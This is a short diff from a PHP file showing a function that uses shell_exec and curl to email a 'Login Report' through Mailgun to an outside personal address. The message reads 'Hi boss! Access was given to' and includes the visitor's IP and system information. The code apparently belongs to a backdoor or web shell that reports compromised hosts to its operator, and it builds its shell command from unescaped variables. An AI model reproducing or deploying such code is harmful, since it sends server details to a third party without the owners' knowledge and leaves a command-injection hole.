@@ -57,7 +57,7 @@ function mailboss(){
         $output = shell_exec("
         curl -s --user 'api:".$sm."' \
             ".$sdomain." \
-            -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
+            -F from='Project Neo <info@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
             -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".sys()."</pre><br>'
